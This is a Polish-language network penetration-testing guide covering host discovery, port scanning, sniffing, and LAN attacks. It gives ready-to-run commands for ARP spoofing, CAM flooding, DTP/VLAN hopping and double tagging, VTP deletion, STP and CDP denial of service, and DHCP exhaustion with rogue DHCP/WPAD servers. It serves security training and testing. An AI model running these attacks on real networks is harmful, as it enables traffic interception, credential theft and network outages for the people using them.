# Pentesting sieci

{{#include ../../banners/hacktricks-training.md}}



## Odkrywanie hostów z zewnątrz

To będzie krótka sekcja o tym, jak znaleźć **IPs odpowiadające** z **Internetu**.\
W tej sytuacji masz pewien **zakres adresów IP** (może nawet kilka **zakresów**) i po prostu chcesz ustalić, **które IPs odpowiadają**.

### ICMP

To jest **najprostszy** i **najszybszy** sposób, aby sprawdzić, czy host jest online.\
Możesz spróbować wysłać kilka pakietów **ICMP** i **oczekiwać odpowiedzi**. Najłatwiej wysłać **echo request** i oczekiwać odpowiedzi. Możesz to zrobić za pomocą prostego `ping` lub używając `fping` dla **zakresów**.\
Możesz też użyć **nmap**, aby wysyłać inne typy pakietów ICMP (to pozwoli ominąć filtry blokujące typowe odpowiedzi na ICMP echo request).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Często zdarza się, że wszystkie rodzaje ICMP packets są filtrowane. Wtedy jedyne, co możesz zrobić, żeby sprawdzić, czy host jest up, to **spróbować znaleźć open ports**. Każdy host ma **65535 ports**, więc, jeśli masz "big" scope, nie możesz przetestować, czy **each port** każdego hosta jest open czy nie — zajmie to zbyt dużo czasu.\
Potrzebujesz więc **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) i listy **ports more used:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Możesz też wykonać ten krok za pomocą `nmap`, ale jest on wolniejszy i `nmap` ma pewne problemy z identyfikowaniem aktywnych hostów.

### Odkrywanie portów HTTP

To jest po prostu wykrywanie portów TCP przydatne, gdy chcesz **skoncentrować się na odkrywaniu** **usług HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Możesz też spróbować sprawdzić, czy jakiś **UDP port open** istnieje, aby zdecydować, czy powinieneś **zwrócić większą uwagę** na **host.** Ponieważ UDP services zwykle **nie odpowiadają** żadnymi danymi na zwykły pusty UDP probe packet, trudno stwierdzić, czy port jest filtrowany czy open. Najłatwiejszym sposobem jest wysłać packet powiązany z uruchomioną service — a skoro nie wiesz, która service działa, powinieneś spróbować tych najbardziej prawdopodobnych w oparciu o port number:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Wcześniej zaproponowana linia nmap przetestuje **top 1000 UDP ports** na każdym hoście w zakresie **/24**, ale nawet to zajmie **>20min**. Jeśli potrzebujesz **najszybszych wyników**, możesz użyć [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` To wyśle te **UDP probes** na ich **expected port** (dla zakresu /24 zajmie to tylko 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Odkrywanie portów SCTP
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Tutaj znajdziesz przydatny przewodnik po wszystkich dobrze znanych Wifi attacks w chwili pisania:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Odkrywanie hosts od wewnątrz

Jeśli jesteś inside the network jedną z pierwszych rzeczy, które zechcesz zrobić, jest **odkryć inne hosts**. W zależności od tego, **ile hałasu** możesz/chcesz generować, można wykonać różne działania:

### Passive

Możesz użyć tych narzędzi do pasywnego odkrywania hosts wewnątrz podłączonej network:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Active

Zauważ, że techniki omówione w [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) mogą być również **zastosowane tutaj**.\
Jednak, ponieważ znajdujesz się w **tej samej sieci** co pozostałe hosty, możesz zrobić **więcej rzeczy**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktywny ICMP

Zwróć uwagę, że techniki opisane w _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) można też **zastosować tutaj**.\
Jednakże, ponieważ jesteś w **tej samej sieci** co pozostałe hosty, możesz zrobić **więcej rzeczy**:

- Jeśli wykonasz **ping** na **adres rozgłoszeniowy podsieci**, ping powinien dotrzeć do **każdego hosta** i mogą one **odpowiedzieć** **tobie**: `ping -b 10.10.5.255`
- Wysyłając **ping** na **network broadcast address** możesz nawet znaleźć hosty w **innych podsieciach**: `ping -b 255.255.255.255`
- Użyj flag `-PE`, `-PP`, `-PM` w `nmap`, aby wykonać wykrywanie hostów wysyłając odpowiednio **ICMPv4 echo**, **timestamp**, i **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan służy do **włączenia** komputerów przez **network message**.\
Magic packet używany do włączenia komputera to pakiet, w którym podany jest **MAC Dst**, a następnie jest on **powtórzony 16 razy** wewnątrz tego samego pakietu.\
Tego typu pakiety są zwykle wysyłane w **ethernet 0x0842** lub w **UDP packet to port 9**.\
Jeśli **no \[MAC]** nie zostanie podany, pakiet zostanie wysłany na **broadcast ethernet** (a broadcast MAC będzie tym, który jest powtarzany).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skanowanie hostów

Po odkryciu wszystkich adresów IP (zewnętrznych lub wewnętrznych), które chcesz przeskanować szczegółowo, można wykonać różne działania.

### TCP

- **Otwarty** port: _SYN --> SYN/ACK --> RST_
- **Zamknięty** port: _SYN --> RST/ACK_
- **Filtrowany** port: _SYN --> \[NO RESPONSE]_
- **Filtrowany** port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

There are 2 options to scan an UDP port:

- Wyślij **UDP packet** i sprawdź odpowiedź _**ICMP unreachable**_, jeśli port jest **closed** (w wielu przypadkach ICMP będzie **filtered**, więc nie otrzymasz żadnej informacji, czy port jest zamknięty czy otwarty).
- Wyślij **formatted datagrams** aby wywołać odpowiedź od **service** (np. DNS, DHCP, TFTP i inne, jak wymienione w _nmap-payloads_). Jeśli otrzymasz **response**, to port jest **open**.

**Nmap** połączy obie opcje używając "-sV" (skany UDP są bardzo wolne), ale zauważ, że skany UDP są wolniejsze niż skany TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** został zaprojektowany do użycia obok **TCP (Transmission Control Protocol)** i **UDP (User Datagram Protocol)**. Jego głównym celem jest ułatwienie przesyłania danych telefonicznych przez sieci IP, odzwierciedlając wiele cech niezawodności znanych z **Signaling System 7 (SS7)**. **SCTP** jest podstawowym składnikiem rodziny protokołów **SIGTRAN**, której celem jest transport sygnałów SS7 przez sieci IP.

Wsparcie dla **SCTP** zapewniają różne systemy operacyjne, takie jak **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** i **VxWorks**, co wskazuje na jego szerokie zastosowanie i użyteczność w telekomunikacji i sieciach.

Dla SCTP nmap oferuje dwa różne skany: _-sY_ i _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **Więcej opcji nmap**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Ujawnianie wewnętrznych adresów IP

**Nieprawidłowo skonfigurowane routers, firewalls i network devices** czasami odpowiadają na sondy sieciowe, używając **adresów źródłowych spoza sieci publicznej**. **tcpdump** można wykorzystać do identyfikacji pakietów otrzymanych z prywatnych adresów podczas testów. Konkretnie, na **Kali Linux** pakiety można przechwycić na **eth2 interface**, który jest dostępny z publicznego Internetu. Należy pamiętać, że jeśli Twoja konfiguracja znajduje się za **NAT** lub **Firewall**, takie pakiety prawdopodobnie zostaną odfiltrowane.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing umożliwia poznanie szczegółów dotyczących IP ranges, subnet sizes, MAC addresses oraz hostnames poprzez przeglądanie przechwyconych frames i packets. Jeśli sieć jest źle skonfigurowana lub switching fabric jest przeciążony, atakujący mogą przechwycić wrażliwe materiały za pomocą passive network sniffing.

Jeśli przełączana sieć Ethernet jest poprawnie skonfigurowana, zobaczysz tylko broadcast frames oraz ruch przeznaczony dla Twojego MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Można też capture packets z zdalnej maszyny przez sesję SSH, używając Wireshark jako GUI w czasie rzeczywistym.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Oczywiście.

### Capturing credentials

Możesz użyć narzędzi takich jak [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) do wyodrębniania poświadczeń z pcap lub z aktywnego interfejsu.

## Ataki w sieci LAN

### ARP spoofing

ARP Spoofing polega na wysyłaniu gratuitous ARPResponses, które informują, że IP danej maszyny odpowiada MAC naszego urządzenia. Wówczas ofiara zaktualizuje tabelę ARP i będzie kierować ruch do naszego urządzenia za każdym razem, gdy będzie próbowała połączyć się z sfałszowanym IP.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Przepełnij CAM table przełącznika, wysyłając wiele pakietów z różnymi source mac address. Gdy CAM table jest pełna, switch zaczyna zachowywać się jak hub (rozgłaszając cały ruch).
```bash
macof -i <interface>
```
W nowoczesnych switchach ta podatność została naprawiona.

### 802.1Q VLAN / DTP Atacks

#### Dynamic Trunking

Protokół **Dynamic Trunking Protocol (DTP)** został zaprojektowany jako protokół warstwy łącza, mający na celu ułatwienie automatycznego mechanizmu dla trunking, pozwalając przełącznikom automatycznie wybierać porty do trybu trunk (Trunk) lub trybu nie-trunk.

Wdrożenie **DTP** jest często postrzegane jako oznaka suboptymalnego projektu sieci, co podkreśla znaczenie ręcznej konfiguracji trunków tylko tam, gdzie jest to konieczne, oraz zapewnienia odpowiedniej dokumentacji.

Domyślnie porty switchy są ustawione w trybie Dynamic Auto, co oznacza, że są gotowe do inicjacji trunking, jeśli zażąda tego sąsiedni przełącznik. Problem bezpieczeństwa pojawia się, gdy pentester lub atakujący podłącza się do switcha i wysyła ramkę DTP Desirable, zmuszając port do wejścia w tryb trunk. Działanie to pozwala atakującemu na enumerację VLANów poprzez analizę ramek STP oraz obejście segmentacji VLAN przez utworzenie wirtualnych interfejsów.

Obecność DTP w wielu switchach domyślnie może być wykorzystana przez przeciwników do naśladowania zachowania przełącznika, uzyskując w ten sposób dostęp do ruchu we wszystkich VLANach. Skrypt [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) służy do monitorowania interfejsu, ujawniając, czy przełącznik znajduje się w trybie Default, Trunk, Dynamic, Auto czy Access — ten ostatni jest jedyną konfiguracją odporną na VLAN hopping attacks. To narzędzie ocenia status podatności przełącznika.

Jeżeli zostanie wykryta podatność w sieci, narzędzie _**Yersinia**_ może zostać użyte do "enable trunking" przez protokół DTP, co pozwala na obserwację pakietów ze wszystkich VLANów.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Aby enumerować VLANs, można też wygenerować ramkę DTP Desirable za pomocą skryptu [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. D**o nie przerywaj skryptu w żadnym wypadku. Wstrzykuje DTP Desirable co trzy sekundy. **Dynamicznie utworzone kanały trunk na switchu istnieją tylko przez pięć minut. Po pięciu minutach trunk zanika.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Chciałbym zwrócić uwagę, że **Access/Desirable (0x03)** wskazuje, że ramka DTP jest typu Desirable, co każe portowi przełączyć się w tryb Trunk. A **802.1Q/802.1Q (0xa5** wskazuje typ enkapsulacji **802.1Q**.

Analizując ramki STP, **dowiadujemy się o istnieniu VLAN 30 i VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atakowanie konkretnych VLAN-ów

Gdy znasz już ID VLAN-ów i wartości IP, możesz **skonfigurować interfejs wirtualny, aby zaatakować konkretny VLAN**.\
Jeśli DHCP nie jest dostępny, użyj _ifconfig_, aby ustawić statyczny adres IP.

<details>
<summary>Konfiguracja interfejsu VLAN (przykład)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatyczny VLAN Hopper

Opisywany atak **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** innych VLAN-ów jest **automatycznie wykonywany** przez narzędzie: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Jeśli attacker zna wartość **MAC, IP and VLAN ID of the victim host**, może spróbować **double tag a frame** — oznaczyć ramkę zarówno VLAN-em przypisanym, jak i VLAN-em ofiary — i wysłać pakiet. Ponieważ **victim won't be able to connect back** do attackera, najlepszą opcją dla attackera jest komunikacja przez UDP z protokołami, które mogą wykonać interesujące akcje (np. SNMP).

Inną opcją dla attackera jest uruchomienie **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (prawdopodobnie przez internet). Następnie attacker może sniff na drugim hoście będącym w jego posiadaniu, aby sprawdzić, czy otrzymuje pakiety od victim.

![](<../../images/image (190).png>)

Do przeprowadzenia tego ataku możesz użyć scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Jeśli masz **access to a switch that you are directly connected to**, masz możliwość **bypass VLAN segmentation** w sieci. Wystarczy **switch the port to trunk mode** (otherwise known as trunk), utworzyć interfejsy wirtualne z ID docelowych VLAN-ów i skonfigurować adres IP. Możesz spróbować uzyskać adres dynamicznie (DHCP) lub skonfigurować go statycznie — zależy od przypadku.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

W pewnych środowiskach, takich jak sieci bezprzewodowe dla gości, stosuje się ustawienia **port isolation (also known as private VLAN)**, aby uniemożliwić klientom podłączonym do access pointa bezpośrednią komunikację między sobą. Jednak zidentyfikowano technikę, która może obejść te środki izolacji. Technika ta wykorzystuje albo brak sieciowych ACL, albo ich nieprawidłową konfigurację, umożliwiając trasowanie pakietów IP przez router w celu dotarcia do innego klienta w tej samej sieci.

Atak jest przeprowadzany przez stworzenie **pakietu, który niesie adres IP docelowego klienta, ale z MAC routera**. Powoduje to, że router błędnie przekierowuje pakiet do klienta docelowego. Podejście to jest podobne do używanego w Double Tagging Attacks, gdzie wykorzystuje się kontrolę nad hostem dostępnym dla ofiary, aby eksploatować tę lukę.

**Key Steps of the Attack:**

1. **Crafting a Packet:** Specjalnie przygotowany pakiet zawiera adres IP docelowego klienta, ale z MAC routera.
2. **Exploiting Router Behavior:** Przygotowany pakiet jest wysyłany do routera, który w wyniku konfiguracji przekazuje pakiet do klienta docelowego, omijając izolację zapewnianą przez private VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) centralizuje zarządzanie VLAN-ami. Wykorzystuje numery rewizji do utrzymania integralności bazy danych VLAN; każda modyfikacja inkrementuje ten numer. Przełączniki przyjmują konfiguracje z wyższymi numerami rewizji, aktualizując własne bazy danych VLAN.

#### VTP Domain Roles

- **VTP Server:** Zarządza VLAN-ami — tworzy, usuwa, modyfikuje. Broadcastuje VTP announcements do członków domeny.
- **VTP Client:** Odbiera VTP announcements, aby zsynchronizować swoją bazę VLAN. Ta rola uniemożliwia lokalne modyfikacje konfiguracji VLAN.
- **VTP Transparent:** Nie uczestniczy w aktualizacjach VTP, ale przekazuje VTP announcements. Nie jest dotknięty atakami VTP i utrzymuje stały numer rewizji równy zero.

#### VTP Advertisement Types

- **Summary Advertisement:** Broadcastowane przez VTP Server co 300 sekund, niosąc podstawowe informacje o domenie.
- **Subset Advertisement:** Wysyłane po zmianach konfiguracji VLAN.
- **Advertisement Request:** Wydawane przez VTP Clienta w celu zażądania Summary Advertisement, zwykle w odpowiedzi na wykrycie wyższego numeru rewizji konfiguracji.

Luki w VTP można wykorzystywać wyłącznie przez trunk ports, ponieważ VTP announcements krążą wyłącznie przez nie. Po ataku DTP scenariusze mogą przejść do VTP. Narzędzia takie jak Yersinia mogą ułatwić ataki VTP, mające na celu wyczyszczenie VLAN database, co skutecznie zaburza działanie sieci.

Note: This discussion pertains to VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
W trybie graficznym Yersinia wybierz opcję deleting all VTP vlans, aby wyczyścić VLAN database.

### Ataki STP

**Jeśli nie możesz przechwycić BPDU frames na swoich interfejsach, jest mało prawdopodobne, że uda ci się przeprowadzić atak STP.**

#### **STP BPDU DoS**

Wysyłanie dużej liczby BPDUs TCP (Topology Change Notification) lub Conf (BPDUs wysyłanych podczas tworzenia topologii) powoduje przeciążenie przełączników i ich nieprawidłowe działanie.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Gdy wysyłany jest TCP, CAM table switchy zostanie usunięta po 15s. Jeśli ciągle wysyłasz tego typu pakiety, CAM table będzie ciągle restartowana (albo co 15 sekund) i po restarcie switch zachowuje się jak hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Atakujący symuluje zachowanie switcha, aby zostać STP root sieci. Wtedy przez niego przejdzie więcej ruchu. Jest to przydatne, gdy jesteś podłączony do dwóch różnych switches.\
Odbywa się to poprzez wysyłanie pakietów BPDUs CONF, twierdzących, że wartość **priority** jest mniejsza niż rzeczywista wartość aktualnego root switcha.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Jeśli atakujący jest podłączony do 2 przełączników, może zostać rootem nowego drzewa i cały ruch między tymi przełącznikami przejdzie przez niego** (zostanie przeprowadzony atak MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataki CDP

CISCO Discovery Protocol (CDP) jest niezbędny do komunikacji między urządzeniami CISCO, umożliwiając im **rozpoznawanie się nawzajem i wymianę szczegółów konfiguracji**.

#### Pasywne zbieranie danych <a href="#id-0e0f" id="id-0e0f"></a>

CDP jest skonfigurowany do nadawania informacji przez wszystkie porty, co może prowadzić do ryzyka bezpieczeństwa. Atakujący, po podłączeniu do portu przełącznika, może uruchomić sniffery sieciowe takie jak **Wireshark**, **tcpdump** lub **Yersinia**. Działanie to może ujawnić wrażliwe informacje o urządzeniu sieciowym, w tym jego model oraz wersję Cisco IOS, na której działa. Następnie atakujący może celować w konkretne podatności zidentyfikowanej wersji Cisco IOS.

#### Wymuszenie zalewania tabeli CDP <a href="#id-0d6a" id="id-0d6a"></a>

Bardziej agresywne podejście polega na przeprowadzeniu ataku Denial of Service (DoS) poprzez przeciążenie pamięci przełącznika, podszywając się pod prawdziwe urządzenia CISCO. Poniżej znajduje się sekwencja poleceń pozwalająca zainicjować taki atak przy użyciu Yersinia, narzędzia sieciowego służącego do testów:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Podczas tego ataku CPU switcha i CDP neighbor table są mocno obciążone, co prowadzi do tego, co często określa się jako **“network paralysis”** z powodu nadmiernego zużycia zasobów.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Możesz też użyć [**scapy**](https://github.com/secdev/scapy/). Upewnij się, że zainstalowałeś pakiet `scapy/contrib`.

### Ataki VoIP i narzędzie VoIP Hopper

Telefony VoIP, coraz częściej integrowane z urządzeniami IoT, oferują funkcje takie jak otwieranie drzwi czy sterowanie termostatami przez specjalne numery telefoniczne. Jednak ta integracja może stwarzać ryzyko bezpieczeństwa.

Narzędzie [**voiphopper**](http://voiphopper.sourceforge.net) zostało zaprojektowane do emulowania telefonu VoIP w różnych środowiskach (Cisco, Avaya, Nortel, Alcatel-Lucent). Odkrywa VLAN ID sieci głosowej, wykorzystując protokoły takie jak CDP, DHCP, LLDP-MED i 802.1Q ARP.

**VoIP Hopper** oferuje trzy tryby dla Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): analizuje pakiety sieciowe, aby zidentyfikować VLAN ID.
2. **Spoof Mode** (`-c 1`): generuje niestandardowe pakiety naśladujące pakiety rzeczywistego urządzenia VoIP.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): wysyła pakiety identyczne z pakietami konkretnego modelu telefonu Cisco IP.

Preferowany tryb ze względu na szybkość to trzeci. Wymaga podania:

- interfejsu sieciowego atakującego (parametr `-i`).
- nazwy emulowanego urządzenia VoIP (parametr `-E`), zgodnej z formatem nazewnictwa Cisco (np. SEP, po którym następuje adres MAC).

W środowiskach korporacyjnych, aby naśladować istniejące urządzenie VoIP, można:

- sprawdzić etykietę MAC na telefonie.
- przejść do ustawień wyświetlacza telefonu, aby zobaczyć informacje o modelu.
- podłączyć urządzenie VoIP do laptopa i obserwować żądania CDP za pomocą Wireshark.

Przykładowe polecenie do uruchomienia narzędzia w trzecim trybie wyglądałoby następująco:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Ataki DHCP

#### Enumeracja
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Two types of DoS** could be performed against DHCP servers. The first one consists on **simulate enough fake hosts to use all the possible IP addresses**.\
This attack will work only if you can see the responses of the DHCP server and complete the protocol (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). For example, this is **not possible in Wifi networks**.

Another way to perform a DHCP DoS is to send a **DHCP-RELEASE packet using as source code every possible IP**. Then, the server will think that everybody has finished using the IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Bardziej zautomatyzowany sposób na to to użycie narzędzia [DHCPing](https://github.com/kamorin/DHCPig)

Możesz użyć wspomnianych ataków DoS, aby zmusić klientów do pobrania nowych lease'ów w środowisku i wyczerpać zasoby prawdziwych serwerów, przez co przestaną odpowiadać. Kiedy prawdziwe serwery przestaną odpowiadać i klienci spróbują ponownie się połączyć, **możesz serwować złośliwe wartości opisane w następnym akapicie**.

#### Ustaw złośliwe wartości

Fałszywy serwer DHCP można uruchomić przy użyciu skryptu DHCP znajdującego się w `/usr/share/responder/DHCP.py`. Jest to przydatne przy atakach sieciowych, np. przechwytywaniu ruchu HTTP i poświadczeń, przez przekierowywanie ruchu do złośliwego serwera. Ustawienie fałszywej bramy jest jednak mniej skuteczne, ponieważ pozwala jedynie na przechwytywanie ruchu wychodzącego od klienta, pomijając odpowiedzi z prawdziwej bramy. Zamiast tego zaleca się uruchomienie fałszywego serwera DNS lub WPAD, co daje skuteczniejszy atak.

Poniżej opcje konfigurowania fałszywego serwera DHCP:

- **Nasz adres IP (ogłaszanie bramy)**: Użyj `-i 10.0.0.100`, aby ogłosić adres IP swojej maszyny jako bramę.
- **Lokalna domena DNS**: Opcjonalnie użyj `-d example.org`, aby ustawić lokalną domenę DNS.
- **Adres IP oryginalnego routera/bramy**: Użyj `-r 10.0.0.1`, aby określić adres IP prawdziwego routera/bramy.
- **Adres IP głównego serwera DNS**: Użyj `-p 10.0.0.100`, aby ustawić adres IP fałszywego serwera DNS, którym zarządzasz.
- **Adres IP zapasowego serwera DNS**: Opcjonalnie użyj `-s 10.0.0.1`, aby ustawić zapasowy serwer DNS.
- **Maska podsieci lokalnej**: Użyj `-n 255.255.255.0`, aby zdefiniować maskę sieci.
- **Interfejs dla ruchu DHCP**: Użyj `-I eth1`, aby nasłuchiwać ruchu DHCP na wybranym interfejsie sieciowym.
- **Adres konfiguracji WPAD**: Użyj `-w “http://10.0.0.100/wpad.dat”`, aby ustawić adres konfiguracji WPAD, co pomaga w przechwytywaniu ruchu webowego.
